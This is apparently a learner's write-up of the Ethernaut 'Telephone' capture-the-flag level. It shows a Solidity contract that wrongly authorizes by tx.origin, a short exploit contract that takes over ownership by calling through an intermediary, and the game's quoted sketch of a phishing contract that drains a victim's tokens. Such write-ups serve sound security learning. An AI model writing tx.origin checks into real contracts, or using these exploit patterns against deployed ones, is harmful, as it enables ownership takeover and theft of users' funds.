### Original Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
### My Exploit contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';
import "hardhat/console.sol";

contract TelephoneExploit {
    Telephone public originalContract = Telephone(0xE58469710853b35Dae8635EDA1484D4f404eaEa0);
    
    function printTxOriginAndMsgSender() public view {
        console.log("tx.origin", tx.origin);
        console.log("msg.sender", msg.sender);
    }
    
    // Exploit function
    function exploit(address _newOwner) public {
        originalContract.changeOwner(_newOwner);
    }
}
```
Since tx.origin will always stay the same, calling the method changeOwner of the contract via another contract
makes change the owner for the address that was in the parameter.
Because for the contract, the msg.sender is now different then tx.origin

In my word and how i understand it : 
My contract A call the function from contract B with my metamask wallet address and `msg.sender == my contract address` and `tx.origin` will equal my wallet address. So the condition is now true  

what helped me : https://dev.to/fassko/understanding-txorigin-and-msgsender-in-solidity-l9o

### Ethernaut conclusion
While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).

An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.

```
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
```

2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```
function () payable {
  token.transfer(attackerAddress, 10000);
}
```

3. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.